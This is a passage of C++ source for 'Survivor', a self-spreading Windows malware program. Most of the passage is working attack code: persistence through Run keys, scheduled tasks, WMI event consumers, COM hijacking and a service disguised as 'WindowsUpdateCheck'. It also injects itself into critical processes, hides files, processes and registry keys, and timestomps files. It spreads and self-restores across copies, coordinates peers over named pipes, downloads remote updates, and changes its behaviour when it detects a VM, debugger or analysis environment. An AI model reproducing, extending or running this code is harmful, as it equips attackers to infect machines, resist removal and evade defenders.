        spread::RestartAt(selfPath);
    }
    return true;
}

bool EnvAdd() {
    std::string selfDir = utils::GetSelfDir();
    char pathEnv[MAX_ENV_BUFFER];
    if (!GetEnvironmentVariableA("PATH", pathEnv, sizeof(pathEnv))) return false;

    std::string pathStr(pathEnv);
    if (pathStr.find(selfDir) != std::string::npos) return true;

    std::string newPath = selfDir + ";" + pathStr;
    if (!SetEnvironmentVariableA("PATH", newPath.c_str())) return false;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ,
            (const BYTE*)newPath.c_str(), (DWORD)newPath.size() + 1);
        RegCloseKey(hKey);
    }
    return true;
}

bool EnvRemove() {
    std::string selfDir = utils::GetSelfDir();
    char pathEnv[MAX_ENV_BUFFER];
    if (!GetEnvironmentVariableA("PATH", pathEnv, sizeof(pathEnv))) return false;

    std::string pathStr(pathEnv);
    std::string newPath;
    size_t start = 0;

    while (start < pathStr.size()) {
        size_t sep = pathStr.find(";", start);
        std::string part = pathStr.substr(start, sep == std::string::npos ? sep : sep - start);
        if (part != selfDir) {
            if (!newPath.empty()) newPath += ";";
            newPath += part;
        }
        if (sep == std::string::npos) break;
        start = sep + 1;
    }

    if (!SetEnvironmentVariableA("PATH", newPath.c_str())) return false;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ,
            (const BYTE*)newPath.c_str(), (DWORD)newPath.size() + 1);
        RegCloseKey(hKey);
    }
    return true;
}

bool Plant() {
    std::string selfPath = utils::GetSelfPath();
    bool success = persistence::CreateRunKey(selfPath);
    persistence::CreateScheduledTask(selfPath);
    return success;
}

void Status() {
    RegistryData data = registry::Load();
    std::string selfPath = utils::GetSelfPath();

    std::cout << "=== Survivor Status ===" << std::endl;
    std::cout << "Version: " << VERSION << " (build: " << BUILD_DATE << ")" << std::endl;
    std::cout << "Current: " << selfPath << std::endl;
    std::cout << "Hash: " << utils::ComputeHash(selfPath) << std::endl;
    std::cout << "Daemon: " << (g_daemon ? "YES" : "NO") << std::endl;
    std::cout << "Spreading: " << (g_spreading ? "YES" : "NO") << std::endl;
    std::cout << "Persistence: " << (persistence::IsPersistenceInstalled() ? "YES" : "NO") << std::endl;
    std::cout << "ADS Marker: " << (ads::HasMarker(selfPath) ? "YES" : "NO") << std::endl;
    std::cout << std::endl;
    std::cout << "Environment:" << std::endl;
    std::cout << "  VM: " << (detection::IsVirtualMachine() ? "YES" : "NO") << std::endl;
    std::cout << "  Monitor: " << (detection::IsBeingMonitored() ? "YES" : "NO") << std::endl;
    std::cout << "  Analysis: " << (detection::IsAnalysisEnvironment() ? "YES" : "NO") << std::endl;
    std::cout << "  Admin: " << (detection::IsRunningAsAdmin() ? "YES" : "NO") << std::endl;
    std::cout << "  Debugger: " << (detection::IsDebuggerPresent() ? "YES" : "NO") << std::endl;
    std::cout << "  Spread multiplier: " << g_spread_multiplier << "x" << std::endl;
    std::cout << std::endl;
    std::cout << "Known instances (" << data.instances.size() << "):" << std::endl;
    for (const auto& inst : data.instances) {
        bool exists = utils::FileExists(inst.path);
        std::cout << "  [" << (exists ? "OK" : "DEAD") << "]";
        if (inst.has_ads) std::cout << "[ADS]";
        std::cout << " " << inst.path << std::endl;
    }
}

void Summon() {
    RegistryData data = registry::Load();
    std::cout << "=== All Instances ===" << std::endl;
    std::cout << "Last sync: " << data.last_sync << std::endl;
    std::cout << std::endl;
    for (const auto& inst : data.instances) {
        bool exists = utils::FileExists(inst.path);
        std::cout << "[" << (exists ? "alive" : "dead") << "]";
        if (inst.has_ads) std::cout << "[ADS]";
        std::cout << " " << inst.path << std::endl;
    }
}

bool Sync() {
    RegistryData data = registry::Load();
    std::string selfPath = utils::GetSelfPath();
    int synced = 0;

    for (const auto& inst : data.instances) {
        if (inst.path != selfPath && utils::FileExists(inst.path)) {
            if (CopyFileA(selfPath.c_str(), inst.path.c_str(), FALSE)) {
                if (g_config.enable_timestomping) {
                    utils::SetFileTimeStamp(inst.path);
                }
                ++synced;
            }
        }
    }
    std::cout << "Synced " << synced << " instances" << std::endl;
    return synced >= 0;
}

void Check() {
    RegistryData data = registry::Load();
    std::string selfPath = utils::GetSelfPath();

    for (const auto& inst : data.instances) {
        bool exists = utils::FileExists(inst.path);
        if (!exists) {
            std::cout << "Missing: " << inst.path << std::endl;
            if (utils::FileExists(selfPath)) {
                spread::CopyToTarget(selfPath, inst.path);
            }
        }
    }
}

void Spread() {
    g_spreading = true;
    std::string target = utils::SelectTargetPath();
    if (spread::CopyToTarget(utils::GetSelfPath(), target)) {
        registry::Register(target);
        std::cout << "Spread to: " << target << std::endl;
    }
}

void Guardian() {
    injection::InjectIntoCriticalProcesses(utils::GetSelfPath());
}

void Version() {
    std::cout << "Survivor v" << VERSION << std::endl;
    std::cout << "Build: " << BUILD_DATE << std::endl;
    std::cout << "Key: " << SECRET_KEY << std::endl;
}

void Verify() {
    std::string selfPath = utils::GetSelfPath();
    RegistryData data = registry::Load();

    std::cout << "=== Verification ===" << std::endl;
    std::cout << "Binary: " << selfPath << std::endl;
    std::cout << "Hash: " << utils::ComputeHash(selfPath) << std::endl;
    std::cout << "Checksum: " << std::hex << std::uppercase << std::setfill('0') << std::setw(8)
              << utils::ComputeChecksum(selfPath) << std::dec << std::endl;
    std::cout << "Stored: " << std::hex << std::uppercase << std::setfill('0') << std::setw(8)
              << data.checksum << std::dec << std::endl;

    int alive = 0, dead = 0;
    for (const auto& inst : data.instances) {
        if (utils::FileExists(inst.path)) alive++;
        else dead++;
    }
    std::cout << "Instances: " << alive << " alive, " << dead << " dead" << std::endl;
}

void Help() {
    std::cout << "Survivor CLI v" << VERSION << " - Self-preserving autonomous tool" << std::endl;
    std::cout << "Usage: survivor.exe [command]" << std::endl;
    std::cout << std::endl;
    std::cout << "Commands:" << std::endl;
    std::cout << "  (no args)     Start as background daemon" << std::endl;
    std::cout << "  copy <path>    Copy self to target" << std::endl;
    std::cout << "  move <path>    Move self to target" << std::endl;
    std::cout << "  rename <name>  Rename current" << std::endl;
    std::cout << "  hide           Hide and restore from backup" << std::endl;
    std::cout << "  env --add      Add to PATH" << std::endl;
    std::cout << "  env --remove   Remove from PATH" << std::endl;
    std::cout << "  plant          Auto-start on boot" << std::endl;
    std::cout << "  status         Show detailed status" << std::endl;
    std::cout << "  summon         List all instances" << std::endl;
    std::cout << "  sync           Sync all instances" << std::endl;
    std::cout << "  check          Check and restore" << std::endl;
    std::cout << "  spread         Trigger spread" << std::endl;
    std::cout << "  guardian       Inject into critical processes" << std::endl;
    std::cout << "  version        Show version info" << std::endl;
    std::cout << "  verify         Verify integrity" << std::endl;
    std::cout << "  --help         Show this help" << std::endl;
}

bool KillSwitch(const char* key) {
    if (std::string(key) != SECRET_KEY) {
        std::cerr << "Invalid key" << std::endl;
        return false;
    }

    std::cout << "*** CLEAN SHUTDOWN ***" << std::endl;
    g_running = false;
    std::this_thread::sleep_for(std::chrono::seconds(2));

    RegistryData data = registry::Load();

    for (const auto& inst : data.instances) {
        if (utils::FileExists(inst.path)) {
            DeleteFileA(inst.path.c_str());
        }
        std::string ads = inst.path + ":marker";
        if (utils::FileExists(ads)) DeleteFileA(ads.c_str());
    }

    std::string regPath = utils::GetRegistryPath();
    if (utils::FileExists(regPath)) DeleteFileA(regPath.c_str());

    persistence::RemoveRunKey();

    std::string selfPath = utils::GetSelfPath();
    DeleteFileA(selfPath.c_str());

    std::exit(0);
    return true;
}

}

namespace stealth {

void SetHiddenAttributes(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(path.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}

void SetReadOnlyAttributes(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(path.c_str(), attrs | FILE_ATTRIBUTE_READONLY);
    }
}

void RemoveReadOnlyAttributes(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(path.c_str(), attrs & ~FILE_ATTRIBUTE_READONLY);
    }
}

bool IsHidden(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    return (attrs & FILE_ATTRIBUTE_HIDDEN) != 0;
}

void ProtectFile(const std::string& path) {
    SetHiddenAttributes(path);
    SetReadOnlyAttributes(path);
}

void UnprotectFile(const std::string& path) {
    RemoveReadOnlyAttributes(path);
    DWORD attrs = GetFileAttributesA(path.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(path.c_str(), attrs & ~FILE_ATTRIBUTE_HIDDEN & ~FILE_ATTRIBUTE_SYSTEM);
    }
}

}

namespace wmi {

bool CreatePermanentEventConsumer(const std::string& exePath) {
    std::string ns = "root/subscription";
    std::string cmd = "powershell -ExecutionPolicy Bypass -Command \"" 
        "try { "
        "$f = [WMIClass]'\\\\.\\" + ns + ":__EventFilter'; "
        "$fi = $f.CreateInstance(); "
        "$fi.Name = 'SurvivorFilter'; "
        "$fi.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\"; "
        "$fi.QueryLanguage = 'WQL'; "
        "$fi.Put() | Out-Null; "
        "$c = [WMIClass]'\\\\.\\" + ns + ":CommandLineEventConsumer'; "
        "$ci = $c.CreateInstance(); "
        "$ci.Name = 'SurvivorConsumer'; "
        "$ci.CommandLineTemplate = '" + exePath + " --daemon'; "
        "$ci.Put() | Out-Null; "
        "$b = [WMIClass]'\\\\.\\" + ns + ":__FilterToConsumerBinding'; "
        "$bi = $b.CreateInstance(); "
        "$bi.Filter = $fi; "
        "$bi.Consumer = $ci; "
        "$bi.Put() | Out-Null; "
        "} catch {}\"";
    
    ShellExecuteA(NULL, "open", "cmd", (std::string("/c ") + cmd).c_str(), NULL, SW_HIDE);
    return true;
}

bool RemovePermanentEventConsumer() {
    std::string cmd = "powershell -ExecutionPolicy Bypass -Command \""
        "Get-WMIObject -Class __EventFilter -Namespace 'root/subscription' -Filter \\\"Name='SurvivorFilter'\\\" | Remove-WMIObject -ErrorAction SilentlyContinue; "
        "Get-WMIObject -Class CommandLineEventConsumer -Namespace 'root/subscription' -Filter \\\"Name='SurvivorConsumer'\\\" | Remove-WMIObject -ErrorAction SilentlyContinue; "
        "Get-WMIObject -Class __FilterToConsumerBinding -Namespace 'root/subscription' | Where-Object {$_.Filter -match 'SurvivorFilter'} | Remove-WMIObject -ErrorAction SilentlyContinue\"";
    
    ShellExecuteA(NULL, "open", "cmd", (std::string("/c ") + cmd).c_str(), NULL, SW_HIDE);
    return true;
}

}

namespace dll {

bool InjectDLL(const std::string& dllPath, DWORD pid) {
    return injection::InjectIntoProcess(pid, dllPath);
}

bool InjectDLLIntoProcess(const std::string& processName, const std::string& dllPath) {
    DWORD pid = injection::FindProcessId(processName);
    return pid ? InjectDLL(dllPath, pid) : false;
}

}

namespace update {

bool DownloadAndUpdate(const std::string& url, const std::string& destPath) {
    std::string tempPath = destPath + ".tmp";

    HINTERNET hInternet = InternetOpenA("Survivor/2.2.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::ofstream outFile(tempPath, std::ios::binary);
    if (!outFile) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[8192];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outFile.write(buffer, bytesRead);
    }

    outFile.close();
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    if (utils::FileExists(destPath)) {
        DeleteFileA(destPath.c_str());
    }

    return MoveFileA(tempPath.c_str(), destPath.c_str()) != 0;
}

bool CheckForUpdate(const std::string& url) {
    HINTERNET hInternet = InternetOpenA("Survivor/2.2.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[256];
    DWORD bytesRead;
    std::string version;

    while (InternetReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        version += buffer;
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return version.find("2.2.0") == std::string::npos;
}

}

namespace p2p {

struct P2PMessage {
    uint32_t magic;
    uint32_t type;
    uint32_t size;
    char payload[1024];
};

bool SendToPeer(const std::string& namedPipe, const std::string& data) {
    HANDLE hPipe = CreateFileA(namedPipe.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) return false;

    DWORD written;
    P2PMessage msg;
    msg.magic = 0x53555256;
    msg.type = 1;
    msg.size = static_cast<uint32_t>(data.size());
    memset(msg.payload, 0, sizeof(msg.payload));
    data.copy(msg.payload, sizeof(msg.payload) - 1);

    bool result = WriteFile(hPipe, &msg, sizeof(P2PMessage), &written, NULL) != 0;
    CloseHandle(hPipe);
    return result;
}

bool BroadcastToPeers(const std::string& data) {
    RegistryData instances = registry::Load();
    bool allSuccess = true;

    for (const auto& inst : instances.instances) {
        std::string pipeName = "\\\\.\\pipe\\survivor_" + std::to_string(std::hash<std::string>{}(inst.path) % 10000);
        if (!SendToPeer(pipeName, data)) {
            allSuccess = false;
        }
    }
    return allSuccess;
}

void CreateListener(const std::string& pipeName) {
    HANDLE hPipe = CreateNamedPipeA(pipeName.c_str(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) return;

    while (g_running) {
        if (ConnectNamedPipe(hPipe, NULL)) {
            P2PMessage msg;
            DWORD bytesRead;
            if (ReadFile(hPipe, &msg, sizeof(P2PMessage), &bytesRead, NULL)) {
                if (msg.magic == 0x53555256) {
                    std::string cmd(msg.payload, msg.size);
                    if (cmd == "PING") {
                        std::string pong = "PONG";
                        DWORD written;
                        WriteFile(hPipe, pong.c_str(), pong.size(), &written, NULL);
                    } else if (cmd == "SYNC") {
                        registry::Register(utils::GetSelfPath());
                    }
                }
            }
        }
        DisconnectNamedPipe(hPipe);
    }
    CloseHandle(hPipe);
}

std::string EncryptMessage(const std::string& data) {
    std::string result = data;
    for (size_t i = 0; i < result.size(); ++i) {
        result[i] ^= OBFUSCATION_KEY[i % strlen(OBFUSCATION_KEY)];
        result[i] = ~result[i];
    }
    return result;
}

std::string DecryptMessage(const std::string& data) {
    std::string result = data;
    for (size_t i = 0; i < result.size(); ++i) {
        result[i] = ~result[i];
        result[i] ^= OBFUSCATION_KEY[i % strlen(OBFUSCATION_KEY)];
    }
    return result;
}

}

namespace com {

const char* COM_OBJECTS[] = {
    "{B5F8350B-0548-48B1-A6EE-F85C1B1B6BD4}",
    "{9A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D}",
    "{1A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6E}"
};

bool HijackCOM(const std::string& clsid, const std::string& dllPath) {
    HKEY hKey;
    std::string keyPath = "Software\\Classes\\CLSID\\" + clsid + "\\InprocServer32";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)dllPath.c_str(), (DWORD)dllPath.size() + 1);
        RegCloseKey(hKey);
        return true;
    }

    if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)dllPath.c_str(), (DWORD)dllPath.size() + 1);
        RegCloseKey(hKey);
        return true;
    }

    return false;
}

bool InstallCOMPersistence(const std::string& exePath) {
    bool success = true;
    for (const char* clsid : COM_OBJECTS) {
        if (!HijackCOM(clsid, exePath)) success = false;
    }
    return success;
}

bool RemoveCOMPersistence() {
    bool success = true;
    for (const char* clsid : COM_OBJECTS) {
        std::string keyPath = "Software\\Classes\\CLSID\\" + std::string(clsid) + "\\InprocServer32";
        if (RegDeleteTreeA(HKEY_CURRENT_USER, keyPath.c_str()) != ERROR_SUCCESS) success = false;
    }
    return success;
}

}

namespace rootkit {

bool HideFromTaskbar() {
    HWND hwnd = FindWindowA("Shell_TrayWnd", NULL);
    if (hwnd) {
        SetWindowPos(hwnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW);
    }
    return hwnd != NULL;
}

bool HideFromProcessList(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    typedef NTSTATUS(NTAPI* NtSetInformationProcess_t)(HANDLE, ULONG, PVOID, ULONG);
    NtSetInformationProcess_t NtSetInformationProcess = (NtSetInformationProcess_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");

    if (NtSetInformationProcess) {
        ULONG hide = 1;
        NTSTATUS status = NtSetInformationProcess(hProcess, 0x1D, &hide, sizeof(ULONG));
        CloseHandle(hProcess);
        return status >= 0;
    }

    CloseHandle(hProcess);
    return false;
}

bool SetFileVisibility(const std::string& path, bool hide) {
    std::wstring wpath(path.begin(), path.end());
    DWORD attrs = GetFileAttributesW(wpath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) return false;

    DWORD newAttrs = hide ? (attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
                          : (attrs & ~(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM));
    return SetFileAttributesW(wpath.c_str(), newAttrs) != 0;
}

bool HideFile(const std::string& path) { return SetFileVisibility(path, true); }
bool UnhideFile(const std::string& path) { return SetFileVisibility(path, false); }

bool HideRegistryKey(const std::string& keyPath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    RegCloseKey(hKey);

    std::string protectedPath = keyPath + "_protected";
    HKEY hKeyOrig, hKeyNew;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_ALL_ACCESS, &hKeyOrig) == ERROR_SUCCESS) {
        RegCreateKeyExA(HKEY_CURRENT_USER, protectedPath.c_str(), 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKeyNew, NULL);

        char buf[1024];
        DWORD size = sizeof(buf);
        for (DWORD i = 0; RegEnumValueA(hKeyOrig, i, buf, &size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; ++i) {
            RegCopyTreeA(hKeyOrig, buf, hKeyNew);
            size = sizeof(buf);
        }

        RegDeleteTreeA(HKEY_CURRENT_USER, keyPath.c_str());
        RegCloseKey(hKeyOrig);
        RegCloseKey(hKeyNew);
        return true;
    }
    return false;
}

}

namespace service {

SC_HANDLE OpenSCM() {
    return OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
}

SC_HANDLE OpenService(SC_HANDLE hSCManager, DWORD access = SERVICE_ALL_ACCESS) {
    return OpenServiceA(hSCManager, "WindowsUpdateCheck", access);
}

bool InstallService() {
    SC_HANDLE hSCManager = OpenSCM();
    if (!hSCManager) return false;

    std::string exePath = utils::GetSelfPath();
    SC_HANDLE hService = CreateServiceA(hSCManager, "WindowsUpdateCheck", "Windows Update Checker",
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
        exePath.c_str(), NULL, NULL, NULL, NULL, NULL);

    bool result = hService != NULL;
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return result;
}

bool UninstallService() {
    SC_HANDLE hSCManager = OpenSCM();
    if (!hSCManager) return false;

    SC_HANDLE hService = OpenService(hSCManager);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    bool result = DeleteService(hService) != 0;
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return result;
}

bool StartService() {
    SC_HANDLE hSCManager = OpenSCM();
    if (!hSCManager) return false;

    SC_HANDLE hService = OpenService(hSCManager);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    bool result = ::StartServiceA(hService, 0, NULL) != 0;
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return result;
}

bool StopService() {
    SC_HANDLE hSCManager = OpenSCM();
    if (!hSCManager) return false;

    SC_HANDLE hService = OpenService(hSCManager);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    SERVICE_STATUS status;
    bool result = ControlService(hService, SERVICE_CONTROL_STOP, &status) != 0;
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return result;
}

bool IsServiceInstalled() {
    SC_HANDLE hSCManager = OpenSCM();
    if (!hSCManager) return false;

    SC_HANDLE hService = OpenService(hSCManager, SERVICE_QUERY_CONFIG);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

}

namespace daemon {

void AdjustBehavior() {
    if (detection::IsVirtualMachine()) {
        g_spread_multiplier = 10.0;
    }

    if (detection::IsBeingMonitored()) {
        g_verbose = false;
    }

    if (detection::IsAnalysisEnvironment()) {
        g_spread_multiplier = 50.0;
    }

    if (g_config.enable_anti_debug && detection::IsDebuggerPresent()) {
        g_verbose = false;
    }
}

void Start() {
    g_daemon = true;
    g_spreading = true;

    AdjustBehavior();
    registry::Register(utils::GetSelfPath());

    if (persistence::IsPersistenceInstalled()) {
        persistence::CreateRunKey(utils::GetSelfPath());
        persistence::CreateScheduledTask(utils::GetSelfPath());
    }

    std::thread spread(loops::SpreadingLoop);
    std::thread monitor(loops::MonitoringLoop);
    std::thread restore(loops::RestorationLoop);
    std::thread guardian(loops::GuardianLoop);
    std::thread usb(loops::USBMonitorLoop);
    std::thread cleanup(loops::CleanupLoop);

    commands::Log("Daemon mode active");

    while (g_running && !g_exiting) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    spread.join();
    monitor.join();
    restore.join();
    guardian.join();
    usb.join();
    cleanup.join();
}

}

}

int main(int argc, char* argv[]) {
    using namespace survivor;

    for (int i = 1; i < argc; ++i) {
        std::string arg(argv[i]);
        if (arg == "--daemon") {
            g_spreading = true;
        } else if (arg == "--verbose") {
            g_verbose = true;
        } else if (arg == "--quiet") {
            g_verbose = false;
        }
    }

    if (argc == 1 || (argc == 2 && std::string(argv[1]) == "--daemon")) {
        daemon::Start();
        return 0;
    }

    std::string cmd = argv[1];

    if (cmd == "copy" && argc >= 3) {
        commands::Copy(argv[2]);
    } else if (cmd == "move" && argc >= 3) {
        commands::Move(argv[2]);
    } else if (cmd == "rename" && argc >= 3) {
        commands::Rename(argv[2]);
    } else if (cmd == "hide") {
        commands::Hide();
    } else if (cmd == "env" && argc >= 3) {
        if (std::string(argv[2]) == "--add") commands::EnvAdd();
        else if (std::string(argv[2]) == "--remove") commands::EnvRemove();
    } else if (cmd == "plant") {
        commands::Plant();
    } else if (cmd == "status") {
        commands::Status();
    } else if (cmd == "summon") {
        commands::Summon();
    } else if (cmd == "sync") {
        commands::Sync();
    } else if (cmd == "check") {
        commands::Check();
    } else if (cmd == "spread") {
        commands::Spread();
    } else if (cmd == "hide-now") {
        commands::Hide();
    } else if (cmd == "guardian") {
        commands::Guardian();
    } else if (cmd == "version") {
        commands::Version();
    } else if (cmd == "verify") {
        commands::Verify();
    } else if (cmd == "ilovecwj" && argc >= 3) {
        commands::KillSwitch(argv[2]);
    } else if (cmd == "--help" || cmd == "-h" || cmd == "/?") {
        commands::Help();
    } else {
        commands::Help();
    }

    return 0;
}